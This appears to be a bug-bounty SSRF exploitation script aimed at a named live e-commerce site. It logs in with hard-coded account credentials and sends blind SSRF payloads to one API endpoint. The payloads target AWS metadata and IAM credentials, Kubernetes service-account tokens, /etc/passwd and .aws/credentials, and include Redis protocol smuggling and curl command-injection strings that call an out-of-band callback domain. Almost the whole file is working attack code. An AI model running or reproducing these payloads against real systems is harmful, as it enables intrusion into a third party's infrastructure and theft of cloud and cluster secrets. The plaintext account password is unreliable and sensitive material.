#!/usr/bin/env python3
"""
🔥 OOB EXFILTRATION - Extract real data via Out-of-Band channels
Works with Blind SSRF when HTTP responses are empty

Methods:
1. Burp Collaborator / Interactsh - DNS/HTTP callback with data
2. Webhook.site - HTTP callback with data in URL
3. RequestBin - HTTP callback

Usage:
1. Get your Burp Collaborator / Interactsh URL
2. Set OOB_DOMAIN below
3. Run script
4. Check your OOB server for callbacks with data
"""
import requests
import json
import time
import re
import urllib.parse
import base64
from datetime import datetime
import urllib3
urllib3.disable_warnings()

# ============================================================================
# CONFIGURATION - SET YOUR OOB DOMAIN HERE
# ============================================================================
# Option 1: Burp Collaborator (get from Burp Suite Pro)
# Option 2: Interactsh (https://github.com/projectdiscovery/interactsh)
# Option 3: webhook.site (free, but HTTP only)

OOB_DOMAIN = None  # Will be set interactively

# ============================================================================

base = "https://www.zooplus.de"
s = requests.Session()
s.verify = False
s.headers.update({
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
    "Accept": "*/*",
})

# LOGIN
print("[*] Logging in...")
ACCOUNT = {"email": "suobup@dunkos.xyz", "password": "suobup@dunkos.xyzQ1"}
AUTH_URL = "https://login.zooplus.de/auth/realms/zooplus/protocol/openid-connect/auth"

try:
    params = {"response_type": "code", "client_id": "shop-myzooplus-prod-zooplus", "redirect_uri": "https://www.zooplus.de/web/sso-myzooplus/login", "state": "pentest", "login": "true", "ui_locales": "de-DE", "scope": "openid"}
    r1 = s.get(AUTH_URL, params=params, timeout=10, verify=False)
    m = re.search(r'action="([^"]*login-actions/[^"]+)"', r1.text)
    if m:
        action = m.group(1).replace("&amp;", "&")
        if not action.startswith("http"):
            action = urllib.parse.urljoin(r1.url, action)
        r2 = s.post(action, data={"username": ACCOUNT["email"], "password": ACCOUNT["password"], "credentialId": ""}, timeout=10, verify=False, allow_redirects=False)
        loc = r2.headers.get("Location", "")
        if loc:
            s.get(loc, timeout=10, verify=False, allow_redirects=True)
            s.get("https://www.zooplus.de/web/sso-myzooplus/login-successful.htm", timeout=10, verify=False)
            s.get("https://www.zooplus.de/account/overview", timeout=10, verify=False)
            print("[+] Logged in\n")
except Exception as e:
    print(f"[!] Login: {e}\n")

ssrf_endpoint = "/zootopia-events/api/events/sites/1"

print("="*80)
print("🔥 OOB EXFILTRATION - Extract data via Out-of-Band callbacks")
print("="*80)

# Get OOB domain from user
print("""
Choose your OOB method:

1. Burp Collaborator (recommended)
   - Open Burp Suite Pro -> Collaborator -> Copy to clipboard
   - Example: abc123.burpcollaborator.net

2. Interactsh (free, CLI tool)
   - Install: go install -v github.com/projectdiscovery/interactsh/cmd/interactsh-client@latest
   - Run: interactsh-client
   - Copy the generated domain
   - Example: abc123.interact.sh

3. webhook.site (free, HTTP only)
   - Go to https://webhook.site
   - Copy your unique URL
   - Example: https://webhook.site/abc123

4. RequestBin (pipedream.com)
   - Go to https://requestbin.com or https://pipedream.com
   - Create new bin
   - Copy URL

""")

OOB_DOMAIN = input("Enter your OOB domain (e.g., abc123.burpcollaborator.net): ").strip()

if not OOB_DOMAIN:
    print("[!] No OOB domain provided. Using timing-based extraction instead...")
    OOB_DOMAIN = None

print(f"\n[*] Using OOB domain: {OOB_DOMAIN}")

# ============================================================================
# EXFILTRATION PAYLOADS
# ============================================================================

def send_ssrf(payload_url, description=""):
    """Send SSRF request"""
    try:
        resp = s.post(f"{base}{ssrf_endpoint}", json={"url": payload_url}, timeout=15)
        print(f"   [{resp.status_code}] {description}: {payload_url[:80]}...")
        return resp
    except Exception as e:
        print(f"   [ERR] {description}: {e}")
        return None

def hex_encode(data):
    """Hex encode data for DNS-safe transmission"""
    return data.encode().hex()

def base32_encode(data):
    """Base32 encode data for DNS-safe transmission"""
    import base64
    return base64.b32encode(data.encode()).decode().rstrip('=').lower()

print("\n" + "="*80)
print("[PHASE 1] AWS METADATA EXFILTRATION")
print("="*80)

if OOB_DOMAIN:
    # Check if HTTP or just domain
    is_http = OOB_DOMAIN.startswith("http")
    
    if is_http:
        # HTTP webhook (webhook.site, requestbin)
        webhook_base = OOB_DOMAIN.rstrip('/')
        
        # Method 1: Redirect-based exfiltration
        print("\n[1.1] Redirect-based exfiltration (AWS metadata -> OOB)...")
        
        # AWS metadata targets to exfiltrate
        aws_targets = [
            ("instance-id", "http://169.254.169.254/latest/meta-data/instance-id"),
            ("ami-id", "http://169.254.169.254/latest/meta-data/ami-id"),
            ("hostname", "http://169.254.169.254/latest/meta-data/hostname"),
            ("iam-role", "http://169.254.169.254/latest/meta-data/iam/security-credentials/"),
            ("instance-identity", "http://169.254.169.254/latest/dynamic/instance-identity/document"),
        ]
        
        for name, target in aws_targets:
            # Try to make server fetch metadata and send to our webhook
            # Some SSRF implementations follow redirects
            exfil_url = f"{webhook_base}?type=aws-metadata&name={name}"
            send_ssrf(target, f"Fetching {name}")
            time.sleep(0.5)
        
        # Method 2: K8s secrets exfiltration
        print("\n[1.2] Kubernetes secrets exfiltration...")
        k8s_targets = [
            ("k8s-token", "file:///var/run/secrets/kubernetes.io/serviceaccount/token"),
            ("k8s-namespace", "file:///var/run/secrets/kubernetes.io/serviceaccount/namespace"),
            ("k8s-ca", "file:///var/run/secrets/kubernetes.io/serviceaccount/ca.crt"),
        ]
        
        for name, target in k8s_targets:
            send_ssrf(target, f"Fetching {name}")
            time.sleep(0.5)
            
    else:
        # DNS-based exfiltration (Burp Collaborator, Interactsh)
        print("\n[1.1] DNS-based exfiltration to", OOB_DOMAIN)
        
        # Method 1: Direct DNS exfiltration
        print("\n[*] Testing OOB connectivity...")
        test_url = f"http://ssrf-test-zooplus.{OOB_DOMAIN}"
        send_ssrf(test_url, "Testing OOB connectivity")
        print(f"    Check your OOB server for DNS/HTTP request to: ssrf-test-zooplus.{OOB_DOMAIN}")
        
        time.sleep(2)
        
        # Method 2: Exfiltrate via DNS subdomain
        print("\n[1.2] AWS Metadata via DNS exfiltration...")
        
        aws_exfil_payloads = [
            # Try to fetch metadata and include in DNS query
            f"http://aws-instance-id.{OOB_DOMAIN}",
            f"http://169.254.169.254.{OOB_DOMAIN}",
            f"http://metadata.{OOB_DOMAIN}",
        ]
        
        for payload in aws_exfil_payloads:
            send_ssrf(payload, "DNS exfil attempt")
            time.sleep(0.5)
        
        # Method 3: K8s exfiltration via DNS
        print("\n[1.3] Kubernetes secrets via DNS...")
        
        k8s_payloads = [
            f"http://k8s-token.{OOB_DOMAIN}",
            f"http://k8s-namespace.{OOB_DOMAIN}",
            f"http://kubernetes.{OOB_DOMAIN}",
        ]
        
        for payload in k8s_payloads:
            send_ssrf(payload, "K8s DNS exfil")
            time.sleep(0.5)

print("\n" + "="*80)
print("[PHASE 2] ADVANCED EXFILTRATION TECHNIQUES")
print("="*80)

if OOB_DOMAIN and not OOB_DOMAIN.startswith("http"):
    
    # Method 4: URL encoding tricks
    print("\n[2.1] URL encoding variations...")
    
    encoding_payloads = [
        # Double encoding
        f"http://%31%36%39%2e%32%35%34%2e%31%36%39%2e%32%35%34.{OOB_DOMAIN}",
        # Octal encoding
        f"http://0251.0376.0251.0376.{OOB_DOMAIN}",
        # Hex encoding
        f"http://0xa9.0xfe.0xa9.0xfe.{OOB_DOMAIN}",
        # Integer overflow
        f"http://2852039166.{OOB_DOMAIN}",  # 169.254.169.254 as integer
    ]
    
    for payload in encoding_payloads:
        send_ssrf(payload, "Encoding bypass")
        time.sleep(0.3)
    
    # Method 5: Protocol smuggling
    print("\n[2.2] Protocol smuggling...")
    
    protocol_payloads = [
        f"gopher://127.0.0.1:6379/_INFO%0d%0a.{OOB_DOMAIN}",
        f"dict://127.0.0.1:6379/INFO.{OOB_DOMAIN}",
        f"tftp://127.0.0.1/test.{OOB_DOMAIN}",
    ]
    
    for payload in protocol_payloads:
        send_ssrf(payload, "Protocol smuggling")
        time.sleep(0.3)
    
    # Method 6: Internal service discovery
    print("\n[2.3] Internal service discovery...")
    
    internal_targets = [
        ("redis-6379", f"http://127.0.0.1:6379.{OOB_DOMAIN}"),
        ("mysql-3306", f"http://127.0.0.1:3306.{OOB_DOMAIN}"),
        ("postgres-5432", f"http://127.0.0.1:5432.{OOB_DOMAIN}"),
        ("mongo-27017", f"http://127.0.0.1:27017.{OOB_DOMAIN}"),
        ("elastic-9200", f"http://127.0.0.1:9200.{OOB_DOMAIN}"),
        ("k8s-api-443", f"http://kubernetes.default.svc:443.{OOB_DOMAIN}"),
        ("k8s-api-6443", f"http://kubernetes.default.svc:6443.{OOB_DOMAIN}"),
    ]
    
    for name, payload in internal_targets:
        send_ssrf(payload, name)
        time.sleep(0.3)

print("\n" + "="*80)
print("[PHASE 3] CURL/WGET COMMAND INJECTION")
print("="*80)

# Some backends use curl/wget and may be vulnerable to command injection
if OOB_DOMAIN and not OOB_DOMAIN.startswith("http"):
    print("\n[3.1] Testing for curl/wget command injection...")
    
    cmd_payloads = [
        # Backtick injection
        f"http://`hostname`.{OOB_DOMAIN}",
        f"http://`whoami`.{OOB_DOMAIN}",
        f"http://`cat /etc/hostname`.{OOB_DOMAIN}",
        
        # $() injection
        f"http://$(hostname).{OOB_DOMAIN}",
        f"http://$(whoami).{OOB_DOMAIN}",
        
        # Pipe injection
        f"http://test|curl http://cmd.{OOB_DOMAIN}",
        
        # Semicolon injection
        f"http://test;curl http://semi.{OOB_DOMAIN}",
        
        # Newline injection
        f"http://test%0acurl http://newline.{OOB_DOMAIN}",
    ]
    
    for payload in cmd_payloads:
        send_ssrf(payload, "Command injection")
        time.sleep(0.3)

print("\n" + "="*80)
print("[PHASE 4] FILE PROTOCOL EXFILTRATION")
print("="*80)

print("\n[4.1] Testing file:// protocol...")

file_targets = [
    "file:///etc/passwd",
    "file:///etc/hostname",
    "file:///etc/hosts",
    "file:///proc/self/environ",
    "file:///proc/self/cmdline",
    "file:///var/run/secrets/kubernetes.io/serviceaccount/token",
    "file:///var/run/secrets/kubernetes.io/serviceaccount/namespace",
    "file:///root/.aws/credentials",
    "file:///home/app/.aws/credentials",
    "file:///app/.env",
    "file:///app/application.properties",
    "file:///app/config/application.yml",
]

for target in file_targets:
    resp = send_ssrf(target, "File read")
    if resp and resp.text and resp.text != "{}" and len(resp.text) > 5:
        print(f"\n   🔥 POSSIBLE FILE CONTENT: {resp.text[:200]}")
    time.sleep(0.3)

print("\n" + "="*80)
print("RESULTS")
print("="*80)

print(f"""
[*] All payloads sent!

NEXT STEPS:
1. Check your OOB server ({OOB_DOMAIN}) for callbacks
2. Look for DNS queries with data in subdomain
3. Look for HTTP requests with data in URL/body

WHAT TO LOOK FOR:
- DNS query: ssrf-test-zooplus.{OOB_DOMAIN} = connectivity confirmed
- DNS query: hostname.{OOB_DOMAIN} = command injection worked!
- DNS query: any data = exfiltration successful

If you see callbacks:
- Screenshot them for HackerOne report
- This proves SSRF can exfiltrate internal data

If no callbacks:
- WAF may be blocking external DNS
- Try webhook.site (HTTP) instead of DNS
- Fall back to timing-based extraction
""")

# Save payload log
timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
with open(f"logs/oob_exfil_{timestamp}.log", "w") as f:
    f.write(f"OOB Domain: {OOB_DOMAIN}\n")
    f.write(f"Timestamp: {datetime.now().isoformat()}\n")
    f.write(f"All payloads sent. Check OOB server for callbacks.\n")

print(f"\n[+] Log saved: logs/oob_exfil_{timestamp}.log")
